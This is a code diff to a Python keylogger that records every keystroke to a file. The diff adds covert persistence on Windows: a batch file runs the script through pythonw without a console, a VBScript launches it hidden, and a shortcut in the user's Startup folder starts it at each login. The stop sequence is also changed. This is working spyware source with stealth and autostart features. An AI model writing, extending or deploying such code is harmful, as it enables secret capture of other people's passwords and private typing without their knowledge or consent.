@@ -1,8 +1,15 @@
+import os
 from pynput.keyboard import Key, Listener, KeyCode
 from pynput.mouse import Listener as MouseListener
+from win32com.client import Dispatch
+
+PATH = os.getcwd()
+PY_PATH = f"{PATH}\\logger.py"
+BAT_PATH = f"{PATH}\\logger.bat"
+STARTUP_FOLDER = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
 
 log_file = "data.txt"
-sequence_to_stop = ['0' ] #your esc sequence
+sequence_to_stop = ['0', '0', '0' , '7']
 current_sequence = []
 esc_pressed = False
 shift_pressed = False
@@ -23,6 +30,30 @@ numpad_keys = {
     104: '8', 105: '9'
 }
 
+# fn bat file
+def update_bat_file():
+    bat_content = f'@echo off\n pythonw.exe ""{PY_PATH}""'
+    with open('logger.bat', 'w') as bat_file:
+        bat_file.write(bat_content)
+
+# fn vbs file
+def update_vbs_file():
+    vbs_content = f'CreateObject("WScript.Shell").Run "{BAT_PATH}", 0, False'
+    with open('logger.vbs', 'w') as vbs_file:
+        vbs_file.write(vbs_content)
+    vbs_path = os.path.join(PATH, 'logger.vbs')
+    shortcut_path = os.path.join(STARTUP_FOLDER, 'logger.lnk')
+    
+    try:
+        shell = Dispatch('WScript.Shell')
+        shortcut = shell.CreateShortCut(shortcut_path)
+        shortcut.Targetpath = vbs_path
+        shortcut.WorkingDirectory = PATH
+        shortcut.save()
+        # print(f"Shortcut successfully created in startup folder: {shortcut_path}")
+    except Exception as e:
+        print(f"Error creating shortcut in startup: {str(e)}")
+
 def on_press(key):
     global current_sequence, esc_pressed, shift_pressed, caps_lock_on, pressed_keys
 
@@ -34,7 +65,6 @@ def on_press(key):
         with open(log_file, "a") as f:
 
             # Track if Shift or CapsLock is being pressed
-
             if key in [Key.shift, Key.shift_r]:
                 shift_pressed = True
                 f.write('<CAPS ON>')  # Show "CAPS ON" when Shift is pressed
@@ -43,7 +73,6 @@ def on_press(key):
                 f.write('<CAPS ON>' if caps_lock_on else '<CAPS OFF>')  # Toggle Caps Lock state
 
             # Handle specific keys
-
             if key == Key.space:
                 f.write(' ')
                 current_sequence.append(' ')
@@ -70,7 +99,6 @@ def on_press(key):
                         current_sequence.append(key.char.lower())
 
                 # Handle numbers and their shift symbols
-
                 elif key.char.isdigit():
                     if shift_pressed and key.char in shift_symbols:
                         f.write(shift_symbols[key.char])
@@ -86,7 +114,6 @@ def on_press(key):
                 current_sequence.append(f'<{key.name}>\t')
 
         # Check if ESC is being held down and if the sequence matches
-
         if esc_pressed and len(current_sequence) >= len(sequence_to_stop):
             if current_sequence[-len(sequence_to_stop):] == sequence_to_stop:
                 return False  # Stop listener
@@ -103,22 +130,18 @@ def on_release(key):
         pressed_keys.remove(key)
 
     # Check if ESC key is released
-
     if key == Key.esc:
         esc_pressed = False
     else:
         # Remove keys from sequence if ESC is not pressed
-
         if len(current_sequence) > len(sequence_to_stop):
             current_sequence.pop(0)
 
     # Stop if ESC key is pressed
-
     if key == Key.esc:
         esc_pressed = True
 
     # Track if Shift is released
-
     if key in [Key.shift, Key.shift_r]:
         shift_pressed = False
 
